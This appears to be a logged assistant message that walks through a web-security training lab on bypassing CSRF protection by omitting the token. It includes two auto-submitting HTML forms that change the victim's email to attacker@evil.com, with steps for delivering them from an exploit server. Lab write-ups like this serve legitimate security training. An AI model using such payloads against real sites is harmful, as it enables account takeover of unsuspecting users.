{"event": "assistant_message", "timestamp": "2025-07-31T09:29:58.030517+02:00", "content": "To solve this lab, we need to exploit a CSRF vulnerability in the email change functionality. The lab description indicates that the CSRF token validation depends on the token being present. This means that if the token is missing, the validation might be bypassed.\n\n### Step-by-Step Approach:\n\n---\n\n### **1. Analyze the Email Change Functionality**\nFirst, we need to understand how the email change feature works. We will:\n- Log in to the account using the provided credentials (`wiener:peter`).\n- Intercept the email change request to analyze the parameters and whether a CSRF token is required.\n\n#### **Login and Intercept the Request**\n1. **Login URL**: `https://0ad2004a036b802aaa6b2e71004f0076.web-security-academy.net/login`\n2. **Credentials**: `wiener:peter`\n3. **Intercept the Email Change Request**:\n   - After logging in, navigate to the account settings.\n   - Change the email address and intercept the request (e.g., using Burp Suite or browser dev tools).\n\n---\n\n### **2. Identify the Vulnerable Parameter**\nThe intercepted request might look like this:\n```http\nPOST /my-account/change-email HTTP/1.1\nHost: 0ad2004a036b802aaa6b2e71004f0076.web-security-academy.net\nCookie: session=<session_cookie>\nContent-Type: application/x-www-form-urlencoded\n\nemail=newemail@evil.com&csrf=abc123\n```\n- **Observation**: The request includes a `csrf` token. However, the lab description suggests that the validation depends on the token being present. If the token is omitted, the request might still succeed.\n\n---\n\n### **3. Craft the CSRF Payload**\nSince the token validation is conditional (only checks if the token is present), we can bypass it by omitting the token entirely.\n\n#### **Payload (HTML Form)**\n```html\n<html>\n  <body>\n    <form action=\"https://0ad2004a036b802aaa6b2e71004f0076.web-security-academy.net/my-account/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n      <input type=\"submit\" value=\"Submit\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n- **Key Points**:\n  - The form submits a `POST` request to the email change endpoint.\n  - The `csrf` token is omitted.\n  - The `email` parameter is set to `attacker@evil.com`.\n\n---\n\n### **4. Host the Payload on the Exploit Server**\n1. **Exploit Server URL**: Provided in the lab (e.g., `https://exploit-0aXX...exploit-server.net`).\n2. **Steps**:\n   - Copy the HTML payload above.\n   - Paste it into the exploit server's editor.\n   - Save and deliver the exploit to the victim.\n\n---\n\n### **5. Verify the Exploit**\nAfter delivering the payload:\n1. **Check the Email**: Log in to the `wiener` account and verify if the email has been changed to `attacker@evil.com`.\n2. **Lab Completion**: If the email is updated, the lab will be marked as solved.\n\n---\n\n### **Alternative Payload (Auto-Submit)**\nIf the victim is required to click the form, we can automate the submission using JavaScript:\n```html\n<html>\n  <body>\n    <form id=\"csrfForm\" action=\"https://0ad2004a036b802aaa6b2e71004f0076.web-security-academy.net/my-account/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" />\n    </form>\n    <script>\n      document.getElementById(\"csrfForm\").submit();\n    </script>\n  </body>\n</html>\n```\n\n---\n\n### **Expected Outcome**\n- The victim's email will be changed to `attacker@evil.com` without requiring a CSRF token.\n- The lab will be solved.\n\n---\n\n### **Final Notes**\n- If the lab does not work (e.g., HTTP 500 error), the issue might be with the session cookies or the lab environment.\n- Ensure the exploit server is correctly configured to deliver the payload.\n\nWould you like me to simulate the exploit server interaction, or do you have access to upload the payload manually?"}
